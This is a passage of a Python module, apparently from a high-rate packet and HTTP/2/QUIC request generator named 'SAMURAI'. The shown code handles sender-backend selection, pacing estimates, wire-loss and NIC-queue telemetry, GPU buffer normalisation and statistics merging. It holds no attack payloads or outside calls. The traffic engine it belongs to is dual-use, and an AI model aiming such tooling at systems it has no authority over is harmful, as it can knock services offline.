import asyncio
import time
import logging
import socket
import traceback
import ssl
import random
import os
import errno
import numpy as np
from typing import TYPE_CHECKING, Any, Dict

if TYPE_CHECKING:
    from .gpu_payload import H2RequestPlan

# Lazy import httpx for HTTP/2 support
try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False

# Lazy import for WebSockets
try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

# Lazy import for aioquic (QUIC/HTTP3)
try:
    from aioquic.asyncio.client import connect
    from aioquic.quic.configuration import QuicConfiguration
    from aioquic.h3.connection import H3_ALPN, H3Connection
    from aioquic.quic.events import StreamDataReceived
    AIOQUIC_AVAILABLE = True
except ImportError:
    AIOQUIC_AVAILABLE = False

try:
    from . import h2_transport as _h2_transport
    HYPER_H2_AVAILABLE = bool(getattr(_h2_transport, "HYPER_H2_AVAILABLE", False))
except Exception:
    _h2_transport = None
    HYPER_H2_AVAILABLE = False

from . import utils
from . import packet as packet_utils
from . import cpu_packet_engine
from .l7 import c_adapter as l7_c_adapter
from .l7 import dispatch as l7_dispatch
from .l7 import legacy as l7_legacy
from .l7 import telemetry as l7_telemetry
from .l7.types import L7RouteRequest
from .scapy_support import ScapyUnavailableError, require_scapy

log_info = utils.log_info
log_error = utils.log_error
log_warning = utils.log_warning

_GATEWAY_CACHE = {}
_GATEWAY_CACHE_TTL_SEC = float(os.environ.get("SAMURAI_GATEWAY_CACHE_TTL_SEC", "60"))
_SENDER_BACKEND_CHOICES = {"auto", "txring", "c_ext_l3", "python", "xdp"}
_SENDER_FALLBACK_POLICY_CHOICES = {"allow", "fail"}


def _resolve_sender_backend(value) -> str:
    raw = str(value if value is not None else os.environ.get("SAMURAI_SENDER_BACKEND", "auto") or "auto")
    backend = raw.strip().lower()
    if backend not in _SENDER_BACKEND_CHOICES:
        backend = "auto"
    return backend


def _resolve_sender_fallback_policy(value) -> str:
    raw = str(
        value if value is not None else os.environ.get("SAMURAI_SENDER_FALLBACK_POLICY", "allow") or "allow"
    )
    policy = raw.strip().lower()
    if policy not in _SENDER_FALLBACK_POLICY_CHOICES:
        policy = "allow"
    return policy

def _scapy():
    return require_scapy()


def _stats(attempted: int = 0, sent: int = 0, errors: int = 0, bytes_sent_est: int = 0, **extra):
    out = {
        "attempted": int(attempted),
        "sent": int(sent),
        "errors": int(errors),
        "bytes_sent_est": int(bytes_sent_est),
        "buffer_copy_count": 0,
        "buffer_copy_bytes": 0,
        "eagain_retry_count": 0,
        "partial_send_retry_count": 0,
        "buffer_reuse_hits": 0,
        "sender_fallback_reason": "none",
        "sender_backend_requested": "auto",
        "sender_fallback_policy": "allow",
        "actual_rps": 0.0,
        "rate_accuracy_pct": 0.0,
        "jitter_p99_ns": 0.0,
        "ipg_mean_ns": 0.0,
        "sleep_calls": 0,
        "busywait_cycles": 0,
        "so_txtime_active": 0,
        "txtime_errors": 0,
        "txring_flush_call_count": 0,
        "txring_flush_error_count": 0,
        "txring_flush_eagain_count": 0,
        "txring_flush_enobufs_count": 0,
        "txring_flush_ebusy_count": 0,
        "txring_flush_other_errno_count": 0,
        "txring_flush_last_errno": 0,
        "txring_flush_last_errno_name": "NONE",
        "txring_frame_wait_ns": 0,
        "txring_poll_count": 0,
        "flush_mode": "unknown",
        "txring_tp_packets": 0,
        "txring_tp_drops": 0,
        "txring_tp_freeze_q_cnt": 0,
        "txring_packet_version": 0,
        "txring_packet_version_name": "TPACKET_UNKNOWN",
        "txring_batch_target": 0,
        "txring_backoff_ns": 0,
        "host_tx_packets_delta": 0,
        "host_tx_dropped_delta": 0,
        "host_tx_errors_delta": 0,
        "softnet_dropped_delta": 0,
        "softnet_time_squeeze_delta": 0,
        "wire_counter_available": 0,
        "wire_counter_source": "none",
        "wire_counter_confidence": 0.0,
        "wire_counter_reason": "",
        "wire_tx_packets_delta": 0,
        "wire_tx_dropped_delta": 0,
        "wire_tx_errors_delta": 0,
        "wire_tx_bytes_delta": 0,
        "nicq_counter_available": 0,
        "nicq_counter_source": "none",
        "nicq_counter_confidence": 0.0,
        "nicq_counter_reason": "",
        "nicq_pressure_delta": 0,
        "nicq_drop_delta": 0,
        "nicq_fifo_delta": 0,
        "nicq_timeout_delta": 0,
        "nicq_restart_delta": 0,
        "nicq_busy_delta": 0,
        "nicq_pressure_status": "unknown",
        "wire_tx_accounted_packets": 0,
        "wire_tx_over_attempted_packets": 0,
        "wire_loss_measurement_mode": "unknown",
        "wire_loss_est_packets": 0,
        "wire_loss_est_pct": 0.0,
        "wire_loss_raw_packets": 0,
        "wire_loss_raw_uncapped_packets": 0,
        "wire_loss_raw_pct": 0.0,
        "wire_loss_raw_pct_of_attempted": 0.0,
        "wire_loss_raw_over_attempted_packets": 0,
        "wire_loss_raw_over_attempted_pct": 0.0,
        "wire_loss_raw_gt_attempted": 0,
        "wire_loss_estimation_capped": 0,
        "txring_drop_ratio_pct": 0.0,
        "txring_flush_error_ratio_pct": 0.0,
        "txring_flush_eagain_ratio_pct": 0.0,
        "txring_flush_enobufs_ratio_pct": 0.0,
        "txring_flush_ebusy_ratio_pct": 0.0,
        "txring_flush_other_errno_ratio_pct": 0.0,
        "gpu_template_h2d_copy_count": 0,
        "gpu_template_h2d_copy_bytes": 0,
        "gpu_rng_state_alloc_count": 0,
        "gpu_rng_state_reuse_count": 0,
        "l7_active_sessions_peak": 0,
        "l7_conn_rate": 0.0,
        "l7_handshake_p99_ms": 0.0,
        "l7_step_fail_ratio": 0.0,
        "session_success_rate": 0.0,
        "retry_success_rate": 0.0,
        "dp_queue_id": -1,
        "dp_queue_strategy": "unknown",
        "dp_affinity_cpu": -1,
    }
    for k, v in extra.items():
        if isinstance(v, bool):
            out[k] = int(v)
        elif isinstance(v, (int, float)):
            out[k] = float(v) if isinstance(v, float) else int(v)
        elif isinstance(v, str):
            out[k] = v
    return out


def _normalize_l7_output(
    raw_stats: Dict[str, Any],
    *,
    attempted_default: int = 0,
    sender_path: str = "",
    engine_path_used: str = "",
    fallback_reason: str = "none",
    route=None,
) -> Dict[str, Any]:
    out = l7_telemetry.normalize_l7_stats(
        raw_stats,
        attempted_default=attempted_default,
        sender_path=sender_path,
        engine_path_used=engine_path_used,
        fallback_reason=fallback_reason,
    )
    if route is not None:
        out.update(route.as_stats())
    if engine_path_used:
        out["l7_engine_path_used"] = str(engine_path_used)
    return out


def _recompute_loss_metrics(out: dict) -> dict:
    d = dict(out or {})
    attempted = max(0, int(d.get("attempted", 0) or 0))
    tx_packets = max(0, int(d.get("txring_tp_packets", 0) or 0))
    tx_drops = max(0, int(d.get("txring_tp_drops", 0) or 0))
    wire_tx_packets = max(0, int(d.get("wire_tx_packets_delta", 0) or 0))
    wire_counter_available = int(
        bool(
            int(
                d.get(
                    "wire_counter_available",
                    1 if ("wire_tx_packets_delta" in d or "host_tx_packets_delta" in d) else 0,
                )
                or 0
            )
        )
    )
    wire_counter_confidence = max(0.0, min(1.0, float(d.get("wire_counter_confidence", 0.0) or 0.0)))
    wire_counter_source = str(d.get("wire_counter_source", "none") or "none")
    wire_counter_reason = str(d.get("wire_counter_reason", "") or "")
    nicq_counter_available = int(
        bool(
            int(
                d.get(
                    "nicq_counter_available",
                    1 if ("nicq_pressure_delta" in d or "nicq_drop_delta" in d) else 0,
                )
                or 0
            )
        )
    )
    nicq_counter_confidence = max(0.0, min(1.0, float(d.get("nicq_counter_confidence", 0.0) or 0.0)))
    nicq_counter_source = str(d.get("nicq_counter_source", "none") or "none")
    nicq_counter_reason = str(d.get("nicq_counter_reason", "") or "")
    nicq_drop_delta = max(0, int(d.get("nicq_drop_delta", 0) or 0))
    nicq_fifo_delta = max(0, int(d.get("nicq_fifo_delta", 0) or 0))
    nicq_timeout_delta = max(0, int(d.get("nicq_timeout_delta", 0) or 0))
    nicq_restart_delta = max(0, int(d.get("nicq_restart_delta", 0) or 0))
    nicq_busy_delta = max(0, int(d.get("nicq_busy_delta", 0) or 0))
    nicq_pressure_delta = max(0, int(d.get("nicq_pressure_delta", 0) or 0))
    nicq_pressure_delta = max(
        nicq_pressure_delta,
        nicq_drop_delta + nicq_fifo_delta + nicq_timeout_delta + nicq_restart_delta + nicq_busy_delta,
    )
    legacy_host_tx_packets = max(0, int(d.get("host_tx_packets_delta", 0) or 0))
    if (
        wire_counter_available
        and wire_tx_packets <= 0
        and wire_counter_source in ("", "none", "unknown", "legacy_host_tx_packets")
        and legacy_host_tx_packets > 0
    ):
        wire_tx_packets = legacy_host_tx_packets
        wire_counter_source = "legacy_host_tx_packets"
        wire_counter_confidence = max(wire_counter_confidence, 0.5)
        if not wire_counter_reason:
            wire_counter_reason = "wire_tx_packets_missing_using_host_tx_packets_delta"
    host_tx_dropped = max(0, int(d.get("host_tx_dropped_delta", 0) or 0))
    existing_est = max(0, int(d.get("wire_loss_est_packets", 0) or 0))
    existing_raw = max(
        0,
        int(d.get("wire_loss_raw_packets", 0) or 0),
        int(d.get("wire_loss_raw_uncapped_packets", 0) or 0),
    )
    flush_calls = max(0, int(d.get("txring_flush_call_count", 0) or 0))
    flush_errors = max(0, int(d.get("txring_flush_error_count", 0) or 0))
    flush_eagain = max(0, int(d.get("txring_flush_eagain_count", 0) or 0))
    flush_enobufs = max(0, int(d.get("txring_flush_enobufs_count", 0) or 0))
    flush_ebusy = max(0, int(d.get("txring_flush_ebusy_count", 0) or 0))
    flush_other_errno = max(0, int(d.get("txring_flush_other_errno_count", 0) or 0))

    tx_drops_bounded = min(tx_drops, tx_packets) if tx_packets > 0 else tx_drops
    wire_tx_accounted_packets = min(attempted, wire_tx_packets) if wire_counter_available else 0
    wire_tx_over_attempted_packets = max(0, wire_tx_packets - attempted) if wire_counter_available else 0
    if wire_counter_available:
        derived_raw_loss = max(0, attempted - wire_tx_accounted_packets)
        raw_loss_packets = max(existing_raw, derived_raw_loss)
        est_loss_packets = min(attempted, max(existing_est, raw_loss_packets))
        measurement_mode = "wire_tx_packets"
    else:
        raw_loss_packets = max(existing_raw, 0)
        est_loss_packets = min(attempted, max(existing_est, 0))
        measurement_mode = "unavailable"
        # Backward compatibility fallback for legacy test inputs with no wire counters.
        if host_tx_dropped > 0:
            raw_loss_packets = max(raw_loss_packets, host_tx_dropped)
            est_loss_packets = min(attempted, max(est_loss_packets, host_tx_dropped))
            measurement_mode = "host_tx_dropped_fallback"

    raw_over_attempted = max(0, raw_loss_packets - attempted)
    raw_over_attempted_pct = float((100.0 * raw_over_attempted) / max(1, attempted))

    d["wire_counter_available"] = int(wire_counter_available)
    d["wire_counter_source"] = str(wire_counter_source)
    d["wire_counter_confidence"] = float(wire_counter_confidence)
    d["wire_counter_reason"] = str(wire_counter_reason)
    d["nicq_counter_available"] = int(nicq_counter_available)
    d["nicq_counter_source"] = str(nicq_counter_source)
    d["nicq_counter_confidence"] = float(nicq_counter_confidence)
    d["nicq_counter_reason"] = str(nicq_counter_reason)
    d["nicq_pressure_delta"] = int(nicq_pressure_delta) if nicq_counter_available else 0
    d["nicq_drop_delta"] = int(nicq_drop_delta) if nicq_counter_available else 0
    d["nicq_fifo_delta"] = int(nicq_fifo_delta) if nicq_counter_available else 0
    d["nicq_timeout_delta"] = int(nicq_timeout_delta) if nicq_counter_available else 0
    d["nicq_restart_delta"] = int(nicq_restart_delta) if nicq_counter_available else 0
    d["nicq_busy_delta"] = int(nicq_busy_delta) if nicq_counter_available else 0
    d["nicq_pressure_status"] = (
        "warn" if int(d["nicq_pressure_delta"]) > 0 else "ok"
    ) if nicq_counter_available else "unknown"
    d["wire_tx_accounted_packets"] = int(wire_tx_accounted_packets)
    d["wire_tx_over_attempted_packets"] = int(wire_tx_over_attempted_packets)
    d["wire_loss_measurement_mode"] = str(measurement_mode)
    d["wire_loss_raw_packets"] = int(raw_loss_packets)
    d["wire_loss_raw_uncapped_packets"] = int(raw_loss_packets)
    d["wire_loss_raw_pct"] = float((100.0 * raw_loss_packets) / max(1, attempted))
    d["wire_loss_raw_pct_of_attempted"] = float(d["wire_loss_raw_pct"])
    d["wire_loss_raw_over_attempted_packets"] = int(raw_over_attempted)
    d["wire_loss_raw_over_attempted_pct"] = float(raw_over_attempted_pct)
    d["wire_loss_raw_gt_attempted"] = int(raw_over_attempted > 0)
    d["wire_loss_est_packets"] = int(est_loss_packets)
    d["wire_loss_est_pct"] = float((100.0 * est_loss_packets) / max(1, attempted))
    d["wire_loss_estimation_capped"] = int(raw_loss_packets > est_loss_packets)
    d["txring_drop_ratio_pct"] = float((100.0 * tx_drops_bounded) / max(1, tx_packets))
    d["txring_flush_error_ratio_pct"] = float((100.0 * flush_errors) / max(1, flush_calls))
    d["txring_flush_eagain_ratio_pct"] = float((100.0 * flush_eagain) / max(1, flush_calls))
    d["txring_flush_enobufs_ratio_pct"] = float((100.0 * flush_enobufs) / max(1, flush_calls))
    d["txring_flush_ebusy_ratio_pct"] = float((100.0 * flush_ebusy) / max(1, flush_calls))
    d["txring_flush_other_errno_ratio_pct"] = float((100.0 * flush_other_errno) / max(1, flush_calls))
    return d

def _update_live(val, inc):
    if val is not None:
        try:
            with val.get_lock():
                val.value += int(inc)
        except Exception:
            pass


def _env_flag(name: str, default: str = "1") -> bool:
    raw = str(os.environ.get(name, default) or default).strip().lower()
    return raw not in {"0", "false", "no", "off", "disabled"}


def _estimate_paced_packets(
    pacing_config,
    elapsed_s: float,
    *,
    progress_budget: int,
) -> int:
    if pacing_config is None or progress_budget <= 0:
        return 0

    mode = int(getattr(pacing_config, "pacing_mode", 0) or 0)
    est = 0.0

    if mode == 1:  # RPS
        rps = float(getattr(pacing_config, "target_rps", 0.0) or 0.0)
        if rps > 0.0:
            est = elapsed_s * rps
    elif mode == 2:  # IPG
        ipg_ns = int(getattr(pacing_config, "ipg_ns", 0) or 0)
        if ipg_ns > 0:
            est = elapsed_s * (1e9 / float(ipg_ns))
    elif mode == 3:  # BURST
        burst_size = max(1, int(getattr(pacing_config, "burst_size", 1) or 1))
        burst_gap_ns = max(0, int(getattr(pacing_config, "burst_gap_ns", 0) or 0))
        if burst_gap_ns <= 0:
            est = float(progress_budget)
        else:
            est = elapsed_s * (1e9 / float(burst_gap_ns)) * float(burst_size)

    out = int(est)
    if out < 0:
        return 0
    if out > progress_budget:
        return int(progress_budget)
    return out


class _PacedSendRuntimeError(RuntimeError):
    def __init__(self, cause: Exception, progress_emitted: int):
        super().__init__(str(cause))
        self.cause = cause
        self.progress_emitted = int(progress_emitted)


async def _run_paced_send_with_live_progress(
    send_callable,
    *,
    pacing_config,
    progress_budget: int,
    live_progress=None,
):
    loop = asyncio.get_running_loop()
    fut = loop.run_in_executor(None, send_callable)

    budget = max(0, int(progress_budget))
    if budget <= 0 or live_progress is None or not _env_flag("SAMURAI_PACING_PROGRESS_EST", "1"):
        return int(await fut or 0), 0

    try:
        refresh_ms = int(os.environ.get("SAMURAI_PACING_PROGRESS_REFRESH_MS", "200") or 200)
    except Exception:
        refresh_ms = 200
    refresh_s = max(0.05, float(refresh_ms) / 1000.0)

    start = time.monotonic()
    emitted = 0
    soft_cap = max(0, budget - 1)

    while not fut.done():
        await asyncio.sleep(refresh_s)
        target = _estimate_paced_packets(
            pacing_config,
            elapsed_s=max(0.0, time.monotonic() - start),
            progress_budget=budget,
        )
        if target > soft_cap:
            target = soft_cap
        delta = int(target) - int(emitted)
        if delta > 0:
            _update_live(live_progress, delta)
            emitted += delta

    try:
        sent = int(fut.result() or 0)
    except Exception as exc:
        raise _PacedSendRuntimeError(exc, emitted) from exc
    return sent, emitted


def _loss_telemetry_enabled() -> bool:
    mode = str(os.environ.get("SAMURAI_LOSS_TELEMETRY", "auto") or "auto").strip().lower()
    return mode not in {"0", "false", "off", "no", "disabled"}


def _resolve_loss_iface(preferred_iface=None):
    env_iface = str(os.environ.get("SAMURAI_LOSS_IFACE", "") or "").strip()
    if env_iface:
        return env_iface
    return preferred_iface


def _take_loss_snapshot(preferred_iface=None):
    if not _loss_telemetry_enabled():
        return {}
    try:
        from . import loss_telemetry

        return dict(loss_telemetry.snapshot(iface=_resolve_loss_iface(preferred_iface)) or {})
    except Exception:
        return {}


def _take_loss_delta(before: dict, preferred_iface=None) -> dict:
    if not isinstance(before, dict) or not before:
        return {}
    try:
        from . import loss_telemetry

        after = dict(loss_telemetry.snapshot(iface=_resolve_loss_iface(preferred_iface)) or {})
        return dict(loss_telemetry.delta(before, after) or {})
    except Exception:
        return {}


def _attach_loss_telemetry(stats_out: dict, before_snapshot: dict, preferred_iface=None) -> dict:
    out = dict(stats_out or {})
    delta = _take_loss_delta(before_snapshot, preferred_iface=preferred_iface)

    out["host_tx_packets_delta"] = int(delta.get("host_tx_packets_delta", 0) or 0)
    out["host_tx_dropped_delta"] = int(delta.get("host_tx_dropped_delta", 0) or 0)
    out["host_tx_errors_delta"] = int(delta.get("host_tx_errors_delta", 0) or 0)
    out["softnet_dropped_delta"] = int(delta.get("softnet_dropped_delta", 0) or 0)
    out["softnet_time_squeeze_delta"] = int(delta.get("softnet_time_squeeze_delta", 0) or 0)
    out["wire_counter_available"] = int(delta.get("wire_counter_available", 0) or 0)
    out["wire_counter_source"] = str(delta.get("wire_counter_source", "none") or "none")
    out["wire_counter_confidence"] = float(delta.get("wire_counter_confidence", 0.0) or 0.0)
    out["wire_counter_reason"] = str(delta.get("wire_counter_reason", "") or "")
    out["wire_tx_packets_delta"] = int(delta.get("wire_tx_packets_delta", 0) or 0)
    out["wire_tx_dropped_delta"] = int(delta.get("wire_tx_dropped_delta", 0) or 0)
    out["wire_tx_errors_delta"] = int(delta.get("wire_tx_errors_delta", 0) or 0)
    out["wire_tx_bytes_delta"] = int(delta.get("wire_tx_bytes_delta", 0) or 0)
    out["nicq_counter_available"] = int(delta.get("nicq_counter_available", 0) or 0)
    out["nicq_counter_source"] = str(delta.get("nicq_counter_source", "none") or "none")
    out["nicq_counter_confidence"] = float(delta.get("nicq_counter_confidence", 0.0) or 0.0)
    out["nicq_counter_reason"] = str(delta.get("nicq_counter_reason", "") or "")
    out["nicq_pressure_delta"] = int(delta.get("nicq_pressure_delta", 0) or 0)
    out["nicq_drop_delta"] = int(delta.get("nicq_drop_delta", 0) or 0)
    out["nicq_fifo_delta"] = int(delta.get("nicq_fifo_delta", 0) or 0)
    out["nicq_timeout_delta"] = int(delta.get("nicq_timeout_delta", 0) or 0)
    out["nicq_restart_delta"] = int(delta.get("nicq_restart_delta", 0) or 0)
    out["nicq_busy_delta"] = int(delta.get("nicq_busy_delta", 0) or 0)
    return _recompute_loss_metrics(out)


def _apply_pacing_stats(out: dict, stats: dict | None) -> dict:
    d = dict(out or {})
    st = dict(stats or {})

    d["actual_rps"] = float(st.get("actual_rps", 0.0) or 0.0)
    d["rate_accuracy_pct"] = float(st.get("rate_accuracy_pct", 0.0) or 0.0)
    d["jitter_p99_ns"] = float(st.get("jitter_p99_ns", 0.0) or 0.0)
    d["ipg_mean_ns"] = float(st.get("ipg_mean_ns", 0.0) or 0.0)
    d["sleep_calls"] = int(st.get("sleep_calls", 0) or 0)
    d["busywait_cycles"] = int(st.get("busywait_cycles", 0) or 0)
    d["so_txtime_active"] = int(bool(st.get("so_txtime_active", 0)))
    d["txtime_errors"] = int(st.get("txtime_errors", 0) or 0)

    d["txring_flush_call_count"] = int(st.get("txring_flush_call_count", 0) or 0)
    d["txring_flush_error_count"] = int(st.get("txring_flush_error_count", 0) or 0)
    d["txring_flush_eagain_count"] = int(st.get("txring_flush_eagain_count", 0) or 0)
    d["txring_flush_enobufs_count"] = int(st.get("txring_flush_enobufs_count", 0) or 0)
    d["txring_flush_ebusy_count"] = int(st.get("txring_flush_ebusy_count", 0) or 0)
    d["txring_flush_other_errno_count"] = int(st.get("txring_flush_other_errno_count", 0) or 0)
    d["txring_flush_last_errno"] = int(st.get("txring_flush_last_errno", 0) or 0)
    d["txring_flush_last_errno_name"] = str(
        st.get("txring_flush_last_errno_name", "NONE") or "NONE"
    )
    d["txring_frame_wait_ns"] = int(st.get("txring_frame_wait_ns", 0) or 0)
    d["txring_poll_count"] = int(st.get("txring_poll_count", 0) or 0)
    d["txring_tp_packets"] = int(st.get("txring_tp_packets", 0) or 0)
    d["txring_tp_drops"] = int(st.get("txring_tp_drops", 0) or 0)
    d["txring_tp_freeze_q_cnt"] = int(st.get("txring_tp_freeze_q_cnt", 0) or 0)
    d["txring_packet_version"] = int(st.get("txring_packet_version", 0) or 0)
    d["txring_packet_version_name"] = str(
        st.get("txring_packet_version_name", "TPACKET_UNKNOWN") or "TPACKET_UNKNOWN"
    )
    return d


def _normalize_packets_buffer(
    packets_buffer,
    required_bytes: int,
    pool_key: str,
    *,
    return_meta: bool = False,
):
    """
    Normalize packet buffer for TX paths.
    - If a GPU array is provided, copy once into shared pinned host pool.
    - If a NumPy array is non-contiguous, compact it (prefer pinned pool).
    """
    meta = {"buffer_copy_count": 0, "buffer_copy_bytes": 0}

    def _ret(buf):
        if return_meta:
            return buf, meta
        return buf

    if required_bytes <= 0:
        return _ret(packets_buffer)

    # CUDA array interface (CuPy / Numba device arrays, etc.)
    if hasattr(packets_buffer, "__cuda_array_interface__"):
        try:
            from . import gpu_packet
            out = gpu_packet.copy_gpu_to_host_pinned(packets_buffer, key=pool_key, blocking=True)
            meta["buffer_copy_count"] = 1
            meta["buffer_copy_bytes"] = int(required_bytes)
            return _ret(out)
        except Exception as e:
            log_error(f"GPU->host normalize failed, using fallback copy: {e}")
            try:
                # Fallback for CuPy-like arrays
                out = packets_buffer.get()
                meta["buffer_copy_count"] = 1
                meta["buffer_copy_bytes"] = int(required_bytes)
                return _ret(out)
            except Exception:
                pass

    # Normalize memoryview into byte-addressable shape if needed
    if isinstance(packets_buffer, memoryview):
        if packets_buffer.itemsize != 1:
            packets_buffer = packets_buffer.cast("B")
        return _ret(packets_buffer)

    if isinstance(packets_buffer, np.ndarray):
        flat = np.ravel(packets_buffer)
        if flat.dtype != np.uint8:
            if flat.dtype.itemsize == 1:
                flat = flat.view(np.uint8)
            else:
                flat = flat.astype(np.uint8, copy=False)

        if flat.size < required_bytes:
            raise ValueError(
                f"Packet buffer too small: {flat.size} < required {required_bytes} bytes"
            )

        flat = flat[:required_bytes]
        if flat.flags.c_contiguous:
            return _ret(flat)

        try:
            from . import gpu_packet
            out = gpu_packet.get_pinned_host_pool().acquire(required_bytes, dtype=np.uint8, key=pool_key)
            out[:required_bytes] = flat
            meta["buffer_copy_count"] = 1
            meta["buffer_copy_bytes"] = int(required_bytes)
            return _ret(out[:required_bytes])
        except Exception:
            out = np.ascontiguousarray(flat)
            meta["buffer_copy_count"] = 1
            meta["buffer_copy_bytes"] = int(required_bytes)
            return _ret(out)

    return _ret(packets_buffer)


def _merge_stats(*items):
    acc = _stats(
        buffer_copy_count=0,
        buffer_copy_bytes=0,
        eagain_retry_count=0,
        partial_send_retry_count=0,
        buffer_reuse_hits=0,
        permission_error_count=0,
        fallback_count=0,
        sender_fallback_reason="none",
        sender_backend_requested="auto",
        sender_fallback_policy="allow",
        txring_batch_target=0,
        txring_backoff_ns=0,
        l7_active_sessions_peak=0,
        l7_conn_rate=0.0,
        l7_handshake_p99_ms=0.0,
        l7_step_fail_ratio=0.0,
        session_success_rate=0.0,
        retry_success_rate=0.0,
        dp_queue_id=-1,
        dp_queue_strategy="unknown",
        dp_affinity_cpu=-1,
    )
    for it in items:
        if not isinstance(it, dict):
            continue
        acc["attempted"] += int(it.get("attempted", 0) or 0)
        acc["sent"] += int(it.get("sent", 0) or 0)
        acc["errors"] += int(it.get("errors", 0) or 0)
        acc["bytes_sent_est"] += int(it.get("bytes_sent_est", 0) or 0)
        acc["buffer_copy_count"] += int(it.get("buffer_copy_count", 0) or 0)
        acc["buffer_copy_bytes"] += int(it.get("buffer_copy_bytes", 0) or 0)
        acc["eagain_retry_count"] += int(it.get("eagain_retry_count", 0) or 0)
        acc["partial_send_retry_count"] += int(it.get("partial_send_retry_count", 0) or 0)
        acc["buffer_reuse_hits"] += int(it.get("buffer_reuse_hits", 0) or 0)
        item_actual_rps = float(it.get("actual_rps", 0.0) or 0.0)
        if item_actual_rps > 0.0 or float(acc.get("actual_rps", 0.0) or 0.0) == 0.0:
            acc["actual_rps"] = item_actual_rps
        item_rate_accuracy = float(it.get("rate_accuracy_pct", 0.0) or 0.0)
        if item_rate_accuracy > 0.0 or float(acc.get("rate_accuracy_pct", 0.0) or 0.0) == 0.0:
            acc["rate_accuracy_pct"] = item_rate_accuracy
        item_jitter_p99 = float(it.get("jitter_p99_ns", 0.0) or 0.0)
        if item_jitter_p99 > 0.0 or float(acc.get("jitter_p99_ns", 0.0) or 0.0) == 0.0:
            acc["jitter_p99_ns"] = item_jitter_p99
        item_ipg_mean = float(it.get("ipg_mean_ns", 0.0) or 0.0)
        if item_ipg_mean > 0.0 or float(acc.get("ipg_mean_ns", 0.0) or 0.0) == 0.0:
            acc["ipg_mean_ns"] = item_ipg_mean
        acc["sleep_calls"] += int(it.get("sleep_calls", 0) or 0)
        acc["busywait_cycles"] += int(it.get("busywait_cycles", 0) or 0)
        acc["so_txtime_active"] = max(
            int(acc.get("so_txtime_active", 0) or 0),
            int(bool(it.get("so_txtime_active", 0))),
        )
        acc["txtime_errors"] += int(it.get("txtime_errors", 0) or 0)
        acc["permission_error_count"] += int(it.get("permission_error_count", 0) or 0)
        acc["fallback_count"] += int(it.get("fallback_count", 0) or 0)
        item_fallback_reason = str(it.get("sender_fallback_reason", "") or "").strip()
        if item_fallback_reason:
            curr_reason = str(acc.get("sender_fallback_reason", "") or "").strip()
            if not curr_reason or curr_reason == "none":
                acc["sender_fallback_reason"] = item_fallback_reason
            elif curr_reason != item_fallback_reason and curr_reason != "mixed":
                acc["sender_fallback_reason"] = "mixed"
        item_sender_backend_requested = str(it.get("sender_backend_requested", "") or "").strip()
        if item_sender_backend_requested:
            curr_backend = str(acc.get("sender_backend_requested", "") or "").strip()
            if not curr_backend or curr_backend == "auto":
                acc["sender_backend_requested"] = item_sender_backend_requested
            elif curr_backend != item_sender_backend_requested and curr_backend != "mixed":
                acc["sender_backend_requested"] = "mixed"
        item_sender_fallback_policy = str(it.get("sender_fallback_policy", "") or "").strip()
        if item_sender_fallback_policy:
            curr_policy = str(acc.get("sender_fallback_policy", "") or "").strip()
            if not curr_policy or curr_policy == "allow":
                acc["sender_fallback_policy"] = item_sender_fallback_policy
            elif curr_policy != item_sender_fallback_policy and curr_policy != "mixed":
                acc["sender_fallback_policy"] = "mixed"
        acc["txring_flush_call_count"] += int(it.get("txring_flush_call_count", 0) or 0)
        acc["txring_flush_error_count"] += int(it.get("txring_flush_error_count", 0) or 0)
        acc["txring_flush_eagain_count"] += int(it.get("txring_flush_eagain_count", 0) or 0)
        acc["txring_flush_enobufs_count"] += int(it.get("txring_flush_enobufs_count", 0) or 0)
        acc["txring_flush_ebusy_count"] += int(it.get("txring_flush_ebusy_count", 0) or 0)
        acc["txring_flush_other_errno_count"] += int(it.get("txring_flush_other_errno_count", 0) or 0)
        _item_last_errno = int(it.get("txring_flush_last_errno", 0) or 0)
        _item_last_errno_name = str(it.get("txring_flush_last_errno_name", "") or "").strip()
        if _item_last_errno or _item_last_errno_name:
            acc["txring_flush_last_errno"] = _item_last_errno
            acc["txring_flush_last_errno_name"] = _item_last_errno_name or "OTHER"
        acc["txring_frame_wait_ns"] += int(it.get("txring_frame_wait_ns", 0) or 0)
        acc["txring_poll_count"] += int(it.get("txring_poll_count", 0) or 0)
        item_flush_mode = str(it.get("flush_mode", "") or "").strip()
        if item_flush_mode:
            curr_flush_mode = str(acc.get("flush_mode", "") or "").strip()
            if not curr_flush_mode or curr_flush_mode == "unknown":
                acc["flush_mode"] = item_flush_mode
            elif curr_flush_mode != item_flush_mode and curr_flush_mode != "mixed":
                acc["flush_mode"] = "mixed"
        acc["txring_tp_packets"] += int(it.get("txring_tp_packets", 0) or 0)
        acc["txring_tp_drops"] += int(it.get("txring_tp_drops", 0) or 0)
        acc["txring_tp_freeze_q_cnt"] += int(it.get("txring_tp_freeze_q_cnt", 0) or 0)
        acc["txring_batch_target"] = max(
            int(acc.get("txring_batch_target", 0) or 0),
            int(it.get("txring_batch_target", 0) or 0),
        )
        acc["txring_backoff_ns"] += int(it.get("txring_backoff_ns", 0) or 0)
        item_txring_ver = int(it.get("txring_packet_version", 0) or 0)
        item_txring_ver_name = str(it.get("txring_packet_version_name", "") or "").strip()
        if item_txring_ver > 0:
            current_ver = int(acc.get("txring_packet_version", 0) or 0)
            current_ver_name = str(acc.get("txring_packet_version_name", "") or "").strip()
            if current_ver <= 0:
                acc["txring_packet_version"] = item_txring_ver
                acc["txring_packet_version_name"] = item_txring_ver_name or "TPACKET_UNKNOWN"
            elif current_ver != item_txring_ver:
                acc["txring_packet_version"] = 0
                acc["txring_packet_version_name"] = "MIXED"
            elif not current_ver_name:
                acc["txring_packet_version_name"] = item_txring_ver_name or "TPACKET_UNKNOWN"
        acc["host_tx_packets_delta"] += int(it.get("host_tx_packets_delta", 0) or 0)
        acc["host_tx_dropped_delta"] += int(it.get("host_tx_dropped_delta", 0) or 0)
        acc["host_tx_errors_delta"] += int(it.get("host_tx_errors_delta", 0) or 0)
        acc["softnet_dropped_delta"] += int(it.get("softnet_dropped_delta", 0) or 0)
        acc["softnet_time_squeeze_delta"] += int(it.get("softnet_time_squeeze_delta", 0) or 0)
        item_wire_avail = int(
            it.get(
                "wire_counter_available",
                1 if ("wire_tx_packets_delta" in it or "host_tx_packets_delta" in it) else 0,
            )
            or 0
        )
        acc["wire_counter_available"] = max(int(acc.get("wire_counter_available", 0) or 0), item_wire_avail)
        item_wire_source = str(it.get("wire_counter_source", "") or "").strip()
        if item_wire_source:
